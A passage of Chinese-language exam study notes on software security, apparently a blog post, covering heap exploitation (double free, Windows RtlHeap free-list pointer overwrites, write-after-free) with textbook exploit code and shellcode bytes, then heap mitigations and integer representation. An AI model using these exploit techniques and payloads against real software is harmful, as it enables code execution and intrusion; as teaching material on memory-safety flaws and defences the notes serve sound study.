class="number">-12</span>);</span><br><span class="line">*((<span class="type">void</span> **)(sixth+<span class="number">4</span>))=(<span class="type">void</span> *)shellcode_location;</span><br><span class="line">seventh = (<span class="type">void</span> *)<span class="built_in">malloc</span>(<span class="number">256</span>); </span><br><span class="line"><span class="built_in">strcpy</span>(fifth, <span class="string">&quot;something&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>first &#x3D; (void *)malloc(256)：利用方式的目标是分配的first块</li>
<li>second &#x3D; (void *)malloc(256);third &#x3D; (void <em>)malloc(256);fourth &#x3D; (void <em>)malloc(256)：对second和fourth块的分配，**可以阻止third块与first块合并。</em></em></li>
<li>free(first)：当first块在初次释放时，<strong>会被放入缓存筐而不是普通筐。</strong></li>
<li>free(third)：释放third块<strong>将first块移到普通筐。</strong></li>
<li>fifth &#x3D; (void <em>)malloc(128)：分配fifth块<strong>会造成内存从third块处分开</strong>，一部分<strong>分配了</strong>，另一部分*<em>还在筐中。</em></em></li>
<li>free(first)：内存已经配置成功，因此对first的<strong>第二次释放构成双重释放漏洞。</strong></li>
<li>sixth &#x3D; (void <em>)malloc(256)：<strong>分配sixth块时，</strong>malloc()返回的指针*<em>与first所指向的内存块相同。</em></em></li>
<li>*((void <em>*)(sixth+0))&#x3D;(void *)(GOT_LOCATION-12)：在被释放后，**写入到first块。</em>*</li>
<li>*((void <em>*)(sixth+4))&#x3D;(void *)shellcode_location：strcpy()函数的GOT地址（减去1）以及shellcode位置**被复制到这块内存（first块）。</em>*</li>
<li>seventh &#x3D; (void <em>)malloc(256)：相同的内存块被<strong>再一次分配给seventh块。</strong>当内存块被分配后，unlink()宏将shellcode的地址*<em>复制到全局偏移表中strcpy的地址处。</em></em></li>
<li>strcpy(fifth, “something”)：<strong>调用strcpy()时，</strong>程序的控制权被转移到shellcode中。shellcode跳过最初的12个字节，因为这部分内存的一些已经被unlink()宏所覆写。</li>
</ul>
<p>双重释放漏洞很难利用，但是在现实世界中已经被成功利用过。写入到已释放内存也是安全缺陷。</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2062.png" alt="image.png"></p>
<h3 id="RTL堆"><a href="#RTL堆" class="headerlink" title="RTL堆"></a>RTL堆</h3><p>1.Windows内存管理</p>
<p><strong>（1）虚拟内存API：32位</strong>地址，4KB<strong>页</strong>，用户地址空间分区域（保护方式、类型以及每页的基分配方式）</p>
<p><strong>（2）堆内存API：</strong>允许用户建立多个动态堆，每一个进程都有一个默认堆。</p>
<p>2.RTL堆</p>
<p>（1）使用<strong>虚拟内存API</strong>，实现了<strong>更高级的局部、全局和CRT内存函数。</strong></p>
<p>（2）内存管理API的错误使用可能导致软件漏洞。需要理解的RTL数据结构：<strong>进程环境块、空闲链表、look-aside链表、内存块的结构</strong></p>
<p>①进程环境块：<strong>PEB维护有每一个进程的全局变量</strong>，PEB被每一个进程的<strong>线程环境块（TEB）所引用</strong>，TEB<strong>则被fs寄存器所引用。</strong></p>
<p>PEB给出<strong>堆数据结构</strong>的信息：<strong>堆的最大数量、堆的实际数量、默认堆的位置、一个指向包含所有堆位置的数组的指针。</strong></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2063.png" alt="image.png"></p>
<p>②<strong>空闲链表</strong>：<strong>有128个双向链表</strong>的数组。位于堆起始（也就是调用HeapCreate（）返回的地址）偏移0x178处，这个链表被RtlHeap用来跟踪空闲内存块。</p>
<p>Freelist[]是一个LIST_ENTRY结构的数组，每一个LIST_ENTRY表示一个双链表的头部。LIST_ENTRY结构定义于winnt.b中，<strong>由一个前向链接（flink）和一个后向链接（blink）组成。</strong></p>
<p>以下图考试练习题有：</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2064.png" alt="image.png"></p>
<ul>
<li>链表中的空闲块<strong>从最小到最大排序</strong>，该数据结构所代表的堆包含有<strong>8个空闲块</strong>：其中有2个空闲块是16字节长，由存储于Freelist[2]中的链表维护，另外的两个48字节长的空闲块由Freelist[6]所维护。</li>
<li><strong>块大小等于表格行索引乘以8个字节（Freelist[0]除外）。</strong></li>
<li>块大小与空闲链表在数组中的位置之间的关系均得到了维护。最后的4个空闲块大小分别为1400、2000、2000和2408字节，它们都比1024大，<strong>因此都由Freelist[0]维护，</strong>并且<strong>按大小升序排列</strong>。当创建一个<strong>新堆</strong>时，<strong>空闲链表被初始化为空。</strong>当链表为空时，<strong>前向和后向链接都指向链表头。</strong></li>
<li>页中未作为第一个内存块的一部分而分配出去的内存，以及那些没有被用作堆控制结构的内存，就被加入空闲列表。对于较小的分配（指的是小于1472字节），<strong>大于1024的被加入到Freelist[0]中。</strong>假设空间足够的话，后续的分配都从这个空闲块中进行。</li>
</ul>
<p><strong>③后备缓存链表</strong></p>
<ul>
<li>在堆分配时创建，用于<strong>加速对小块内存（这里指的是小于1016字节）的分配操作。</strong>后备缓存链表一开始被<strong>初始化为空链表，</strong>然后随着内存被释放而增长。后备缓存链表会<strong>先于空闲链表被检查</strong>。</li>
</ul>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2065.png" alt="image.png"></p>
<ul>
<li>后备缓存链表中的<strong>空闲块的数量会被自动调整</strong>：根据特定大小内存块的分配频率。一个特定大小的内存<strong>被分配得越频繁</strong>，在相应链表中<strong>存储该大小的内存块的数量就越多，</strong>对后备缓存链表的使用使得小块内存的分配速度加快。</li>
</ul>
<p>3.边界标志</p>
<p><strong>（1）调用HeapAlloc()或malloc()所返回的。</strong>这个结构位于HeapAlloc()所返回的地址<strong>之前</strong>，<strong>偏移量为8个字节</strong>。包含：<strong>自身大小、前一块大小、busy标志位、传统的部分。</strong></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2066.png" alt="image.png"></p>
<p>（2）当块<strong>被释放</strong>时：<strong>边界标志仍然存在，空闲内存包含下一块和上一块地址，busy标志位被清空。</strong></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2067.png" alt="image.png"></p>
<p>4.基于堆的缓冲区溢出攻击：通常需要<strong>改写双链表结构中的前向和后向指针。</strong>正常的堆处理过程覆写地址，从而修改程序的执行流程。</p>
<p>练习题有此代码题：发生缓冲区溢出时，h2的<strong>前向指针</strong>被覆写为0012f5b8，<strong>后向指针</strong>被覆写为00409040。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;\x90\x90\x90\x90&quot;</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> malArg[] = <span class="string">&quot;0123456789012345&quot;</span></span><br><span class="line"><span class="string">&quot;\x05\x00\x03\x00\x00\x00\x08\x00&quot;</span> <span class="comment">// 8字节小端整数（可能是长度，标志）</span></span><br><span class="line">**<span class="string">&quot;\xb8\xf5\x12\x00\x40\x90\x40\x00&quot;</span>;** <span class="comment">// 8字节，要写入的指针值</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">mem</span><span class="params">()</span> &#123;</span><br><span class="line">HANDLE hp;</span><br><span class="line">HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>, h3 = <span class="number">0</span>, h4 = <span class="number">0</span>;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>, <span class="number">0x1000</span>, <span class="number">0x10000</span>); <span class="comment">// 第6行，创建新堆</span></span><br><span class="line">h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">16</span>);</span><br><span class="line">h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">128</span>);</span><br><span class="line">h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">16</span>);</span><br><span class="line">HeapFree(hp,<span class="number">0</span>,h2); <span class="comment">// 第10行，释放h2导致在已分配内存中打开了一个缺口</span></span><br><span class="line"><span class="built_in">memcpy</span>(h1, malArg, <span class="number">32</span>); <span class="comment">// h1只有16字节，但复制了32字节，发生缓冲区溢出</span></span><br><span class="line">h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">128</span>); </span><br><span class="line"><span class="comment">// 引发返回地址被shellcode地址覆写</span></span><br><span class="line"><span class="comment">// 对HeapAlloc()的调用会导致shellcode的起始4个字节被返回地址\xb8\xf5\x12\x00所覆盖地址需要可被执行！</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[]) &#123;</span><br><span class="line">mem();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 控制转移到shellcode</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（1）第6行调用Heapcreate()创建了一个新的堆，<strong>初始大小为0x1000，最大大小0x10000。</strong>建立一个新堆简化了利用，因为我们知道堆中的确切内容。第7~9行<strong>分配了3个不同大小的内存块。</strong>这些内存块的<strong>空间是连续的，</strong>因此时<strong>没有合适大小的空闲块可用。</strong></p>
<p>（2）第10行<strong>释放h2</strong>导致<strong>在已分配内在中打开了一个缺口</strong>。这个内存块<strong>被加入空闲链表中</strong>，意味着<strong>其起始8个字节被用指向空闲链表头部的前向和后向指针改写，且busy标志位也被清空。</strong>从h1开始，内存按照如下方式排列：<strong>h1块、空闲块和h3块</strong>。</p>
<p>（3）在本示例利用代码第11行的<strong>缓冲区溢出</strong>发生处，我们没有做任何掩饰性的工作。在这个memcpy()操作中，malArg的起始16个字节<strong>覆写了用户数据区域</strong>。接下来的8个字节<strong>覆写了空闲块的这个标志</strong>。在本例中，利用代码只是保留了现有的信息，因此接下来的正常操作未受影响。malArg接下来的8个字节<strong>覆盖了指向下一个和上一个块的指针。</strong>下一个块的地址被将<strong>被覆写的地址所覆盖</strong>（在本例中是栈中的一个返回地址）。上一个块的地址被<strong>shellcode的地址</strong>所覆写。</p>
<p>（4）现在第12行调用HeapAlloc()所需要的舞台都已搭建完毕，调用发生后，<strong>程序的返回地址将被shellcode的地址覆盖。</strong>之所以如此，是因为对HeapAlloc()的这次调用<strong>所请求的字节数与上一个空闲块大小相同。</strong>结果，RtlHeap从包含受害块的空闲链表中取得了内存块。当空闲块从空闲双链表中移出时，返回地址就被改写成了shellcode的地址。</p>
<p>（5）当mem()函数<strong>在第17行</strong>返回时，<strong>程序的控制权就转移给shellcode。</strong></p>
<p>5.更容易的方法：<strong>通过覆写异常处理器地址获取控制、引发异常</strong></p>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mem</span><span class="params">(<span class="type">char</span> *buf)</span> &#123;</span><br><span class="line">HLOCAL h1 = <span class="number">0</span>, h2 = <span class="number">0</span>;</span><br><span class="line">HANDLE hp;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>, <span class="number">0x1000</span>, <span class="number">0x10000</span>); <span class="comment">// 创建堆</span></span><br><span class="line"><span class="keyword">if</span> (!hp) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">260</span>);</span><br><span class="line"><span class="built_in">strcpy</span>((<span class="type">char</span> *)h1, buf); </span><br><span class="line">h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">260</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;we never get here&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">HMODULE l;</span><br><span class="line">l = LoadLibrary(<span class="string">&quot;wmvcore.dll&quot;</span>);</span><br><span class="line">buildMalArg();</span><br><span class="line">mem(buffer); <span class="comment">// 基于堆的缓冲区溢出</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一次调用HeapAlloc()后的堆的组织形式：</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/7d97ae78-d46b-4b4d-b1a2-50611c33c3ed.png" alt="image.png"></p>
<ul>
<li>h1 &#x3D; HeapAlloc(hp, HEAP_ZERO_MEMORY, 260)：分配了一个单独的内存块堆，包括：段头为h1所分配的<strong>内存段尾。</strong>变量h1指向0x00ba0688，这也是<strong>用户内存的起始地址</strong>。</li>
<li>strcpy((char *)h1, buf)：堆溢出：覆写<strong>段尾</strong>，包括<strong>LIST_Entry结构指针。</strong>很可能在下一个对RtlHeap的调用时被引用。这会触发一个异常。</li>
<li>第一次调用HeapAlloc()后，指向Freelist[0]的前向指针(flink)和后向指针(blink)的地址分别是<strong>0x00ba0798</strong>和<strong>0x00ba079c</strong>，这些指针可以通过<strong>对strcpy()的调用</strong>被覆写。</li>
</ul>
<p>6.RTL Heap</p>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> buffer[<span class="number">1000</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">buildMalArg</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> addr = <span class="number">0</span>, i = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> systemAddr = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> tmp[<span class="number">8</span>]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">systemAddr = GetAddress(<span class="string">&quot;msvcrt.dll&quot;</span>,<span class="string">&quot;system&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">66</span>; i++) <span class="built_in">strcat</span>(buffer, <span class="string">&quot;DDDD&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(buffer, <span class="string">&quot;\xeb\x14&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(buffer, <span class="string">&quot;\x44\x44\x44\x44\x44\x44&quot;</span>); </span><br><span class="line"><span class="built_in">strcat</span>(buffer, <span class="string">&quot;\x73\x68\x68\x08&quot;</span>);</span><br><span class="line"><span class="built_in">strcat</span>(buffer, <span class="string">&quot;\x4c\x04\x5d\x7c&quot;</span>); </span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>; i &lt; <span class="number">21</span>; i++) <span class="built_in">strcat</span>(buffer,<span class="string">&quot;\x90&quot;</span>);</span><br><span class="line">strat(buffer, <span class="string">&quot;\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9&quot;</span>);</span><br><span class="line">fixupaddresses(tmp, systemAddr);</span><br><span class="line"><span class="built_in">strcat</span>(buffer,tmp);</span><br><span class="line"><span class="built_in">strcat</span>(buffer,<span class="string">&quot;\xFF\xD1\x90\x90&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>strcat(buffer, “\x73\x68\x68\x08”)：前向指针被<strong>控制权将要转移到的地址</strong>所取代<strong>。</strong></li>
<li>strcat(buffer, “\x4c\x04\x5d\x7c”)：（这两行代码，<strong>10和11行</strong>）<strong>改写了尾随空闲块的前向和后向指针</strong>。后向指针则被将要<strong>被覆写的内存地址</strong>所取代。</li>
<li>strat(buffer, “\x33\xC0\x50\x68\x63\x61\x6C\x63\x54\x5B\x50\x53\xB9”)：偏移量会<strong>覆写尾随的空闲块的后向指针</strong>，因此缓冲区<strong>控制转移到用户提供的地址</strong>，而不是<strong>未处理的异常处理器。</strong></li>
<li><strong>用来覆盖前向指针的地址就是shellcode的地址</strong>，因为RtlHeap接下来会改写shellcode的起始4个字节，对于攻击者而言，更容易的办法应该是<strong>采用一个跳板</strong>。跳板允许在事先不知道shellcode的绝对地址的情况下<strong>将程序的控制权转移到shellcode处</strong>。跳板可以通过<strong>检查程序的映像或动态链接库</strong>进行定位，也可以通过<strong>加载库并搜索内存</strong>来动态地定位。</li>
<li>RTL堆可能存在漏洞：<strong>写入已释放内存、双重释放、Look-Aside表</strong></li>
</ul>
<p>考试练习题：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// RTLHeap：写入已释放内存</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">unalloc</span> &#123;</span></span><br><span class="line">PVOID fp;</span><br><span class="line">PVOID bp;</span><br><span class="line">&#125; unalloc, *Punalloc;</span><br><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;\x90\x90\x90\xb0\x06\x90\x90&quot;</span>;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[]) &#123;</span><br><span class="line">Punalloc h1;</span><br><span class="line">HLOCAL h2 = <span class="number">0</span>;</span><br><span class="line">HANDLE hp; <span class="comment">// 创建堆</span></span><br><span class="line">hp = HeapCreate(<span class="number">0</span>, <span class="number">0x1000</span>, <span class="number">0x10000</span>);</span><br><span class="line">h1 = (Punalloc)HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">32</span>);  <span class="comment">// 从该堆中分配了一个32字节的内存块，用h1表示</span></span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h1); <span class="comment">// 错误地释放</span></span><br><span class="line">h1-&gt;fp = (PVOID)(<span class="number">0x042B17C</span> - <span class="number">4</span>); <span class="comment">// 用户数据则被错误地写入已释放内存块中</span></span><br><span class="line">h1-&gt;bp = shellcode; </span><br><span class="line">h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">32</span>); </span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h2); <span class="comment">// 控制转移到shellcode</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>代码中所包含的RTL堆漏洞是<strong>写入已释放的内存</strong>。</li>
<li>h2 &#x3D; HeapAlloc(hp, HEAP_ZERO_MEMORY, 32)：对HeapAlloc()的调用使得<strong>HeapFree()的地址</strong>被shellcode的地址所覆盖。</li>
<li>当释放h1时，它被放入一个空闲块大小为32字节的空闲列表中。在空闲列表中可使用的内存块的第一个双字<strong>保存有指向链表中下一个内存块的前向指针，</strong>第二个双字<strong>保存有后向指针。</strong>前向指针<strong>被待改写的地址所取代</strong>，后向指针<strong>则被shellcode的地址所覆盖。</strong></li>
</ul>
<p>练习题：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// RTLHeap: 双重释放</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">HANDLE hp;</span><br><span class="line">HLOCAL h1, h2, h3, h4, h5, h6, h7, h8, h9;</span><br><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">16</span>); <span class="comment">// 内存分配块1</span></span><br><span class="line"><span class="built_in">memset</span>(h1, <span class="string">&#x27;a&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">16</span>);</span><br><span class="line"><span class="built_in">memset</span>(h2, <span class="string">&#x27;b&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">32</span>);</span><br><span class="line"><span class="built_in">memset</span>(h3, <span class="string">&#x27;c&#x27;</span>, <span class="number">32</span>);</span><br><span class="line">h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, <span class="number">16</span>);</span><br><span class="line"><span class="built_in">memset</span>(h4, <span class="string">&#x27;d&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">h5 = HeapAlloc(hp, HEAP_ZERO_MEMORY,<span class="number">8</span>) <span class="comment">// 内存分配块5</span></span><br><span class="line"><span class="built_in">memset</span>(h5, <span class="string">&#x27;e&#x27;</span>, <span class="number">8</span>);</span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h2); <span class="comment">// 释放h2</span></span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h3); <span class="comment">// 释放h3</span></span><br><span class="line">HeapFree(hp, <span class="number">0</span>, h3);</span><br><span class="line">h6 = HeapAlloc(hp, <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line"><span class="built_in">memset</span>(h6, <span class="string">&#x27;f&#x27;</span>, <span class="number">64</span>);</span><br><span class="line"><span class="built_in">strcpy</span>((<span class="type">char</span> *)h4, buffer);</span><br><span class="line">h7 = HeapAlloc(hp, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Never gets here.\n”);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>释放h2之后：</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/6563dcd8-fc2d-457a-b7a2-cd2bf8c8cfd7.png" alt="image.png"></p>
<ul>
<li>FreeList[0]在<strong>0x00BA0708</strong>处包含有一个空闲块。</li>
<li>FreeList[<strong>3</strong>]包含有另一个空闲块，这个空闲块就是<strong>h2</strong>。h1由“aaa…a”填充等。</li>
</ul>
<p>释放h3之后：</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/e8069967-60fc-4a44-85d6-a5abba983cd8.png" alt="image.png"></p>
<ul>
<li>此时h2和h3合并，在FreeList[<strong>8</strong>]新的空闲块h3的用户区域的起始8个字节并不包含指针，但h2中的指针已经被更新。h2中的指针被更新为指向FreeList[<strong>8</strong>]。</li>
</ul>
<p>第二次释放h3之后：</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/beeff8c3-07ff-433b-ab2c-8fb4fe720e34.png" alt="image.png"></p>
<ul>
<li>h3释放第二次之后：空闲块完全消失了，FreeList[0]指向<strong>0x00BA06A0</strong>: <strong>一个2KB大小的空闲块</strong>。</li>
<li>已分配的h4 and h5正好位于这块虚假的未分配的区域。利用：覆写指向FreeList[0]的前向和后向指针。位于0x00BA06A0，当前不可访问。</li>
<li>漏洞利用<strong>代码分配另外的64字节空间</strong>，将8字节的头部以及前向和后向指针数据<strong>写入0x00ba06e0，也就是h4所指向的内存块，</strong>能被覆写。</li>
</ul>
<h3 id="缓解策略"><a href="#缓解策略" class="headerlink" title="缓解策略"></a>缓解策略</h3><p>1.PhkMalloc</p>
<p>（1）被设计成可以<strong>在一个虚拟内存系统中高效运作</strong>，这样就能执行更强的检查，在不解引用指针的前提下<strong>判定传递给free()或realloc()的指针</strong>是否有效。</p>
<p>（2）<strong>不能检测是否传递了一个错误</strong>（但有效）的指针，但它可以<strong>检测所有</strong>不是由malloc()或realloc()返回的值。</p>
<p>（3）检测一个指针是已分配的还是空闲的，因此它可以<strong>检测所有的双重释放错误。</strong>对于未授权进程而言，这些错误都被当作警告看待。启用“A”或“abort”选项则会导致这些警告被当作错误看待，一个错误就表示一个终点，会导致调用abort()</p>
<p>（4）加入了<strong>“J(unk)”和“Z(ero)”</strong>选项，从而可以检测出更多的<strong>内存管理缺陷</strong>。J(unk)选项会在<strong>已分配的区域内填充Oxd0</strong>，Z(ero)选项<strong>也给分配的区域填充垃圾数据</strong>，当用户请求的精确长度为0时则不进行操作。</p>
<p>2.随机化</p>
<p>（1）malloc()调用返回的地址在很大程度上是<strong>可预测的</strong></p>
<p>（2）程序返回的内存块地址随机化，可以使对基于<strong>堆的漏洞</strong>利用变得更加困难</p>
<p>3.哨位页</p>
<p>（1）都是<strong>未映射的</strong>，被放置到<strong>已分配内存（一个页或更大）之间的空间</strong></p>
<p>（2）当攻击者在<strong>利用缓冲区溢出哨位页时</strong>，程序会引发段故障。OpenBSD, Electric Fence, Application Verifier都实现了哨位页。哨位页有着很大的开销。</p>
<p>4.著名的漏洞：<strong>缓冲区溢出漏洞、微软数据访问组件、CVS服务器双重释放漏洞、Kerberos 5中的漏洞</strong></p>
<aside>
📔

<p>总结:</p>
<p>（1）C和C++程序中的动态内存管理容易产生<strong>软件缺陷和安全缺陷</strong></p>
<p>（2）虽然<strong>基于堆的漏洞</strong>比基于栈的漏洞更难被利用，但那些有着内存相关安全缺陷的程序<strong>仍然可能遭受攻击</strong></p>
<p>（3）将良好的程序<strong>设计实践与动态分析</strong>相结合，可以帮助用户在开发过程中<strong>识别和消除</strong>这些安全缺陷</p>
</aside>

<h2 id="整数安全"><a href="#整数安全" class="headerlink" title="整数安全"></a>整数安全</h2><h3 id="整数数据类型"><a href="#整数数据类型" class="headerlink" title="整数数据类型"></a>整数数据类型</h3><p>1.整数安全例子</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> <span class="type">int</span> total;</span><br><span class="line">total = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + <span class="built_in">strlen</span>(argv[<span class="number">2</span>]) + <span class="number">1</span>;</span><br><span class="line"><span class="type">char</span> *buff = (<span class="type">char</span> *)<span class="built_in">malloc</span>(total);</span><br><span class="line"><span class="built_in">strcpy</span>(buff, argv[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">strcat</span>(buff, argv[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.整数表示方法：<strong>原码、反码、补码。</strong>对整数表示法而言，需要考虑的问题主要就是<strong>负数的表示。</strong></p>
<p>（1）原码值的表示方法</p>
<p>利用最高位表示数值的符号：0正、1负。余下的所有低位表示值的大小。如果最高位未置位，表示+41，如果最高位被置位，则表示-41。</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2068.png" alt="image.png"></p>
<p>（2）反码表示法</p>
<p>由于实现原码表示法所需的电路过于复杂，因此人们后来采用反码表示法取而代之。将一个整数值的每一位取反，就得到于其对应的负数。</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2069.png" alt="image.png"></p>
<p>练习：整数10101001用反码表示为<strong>01010110</strong></p>
<p>（3）补码表示法</p>
<p>补码表示法的负数是在反码表示法的结果末位加1而得。补码表示法对0只有+0一种表示。<strong>最高位仍然是符号位</strong>。正数的补码表示法则与原码表示法相同。</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2070.png" alt="image.png"></p>
<p>练习：整数00101000用补码表示为<strong>00101000</strong></p>
<p>3.带符号和无符号类型</p>
<p>（1）C和C++中的整数分为<strong>带符号和无符号</strong>两种，每一种带符号类型都有<strong>对应的无符号类型。</strong></p>
<p>（2）带符号整数：带符号整型<strong>用来表示正值和负值。</strong>在一个使用<strong>补码</strong>表示法的计算机上，带符号整数的取值范围是**$(-2^{n-1})$~$(2^{n-1})-1$<strong>。反码和原码最小值：</strong>$(-2^{n-1})+1$**</p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2071.png" alt="image.png"></p>
<p>（3）无符号整数：取值范围是0~<strong>$2^n-1$<strong>。</strong>任一种带符号整型都有对应的无符号整型。</strong></p>
<p><img src="/2026/01/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E5%9C%B0%E6%96%B9/image%2072.png" alt="image.png"></p>
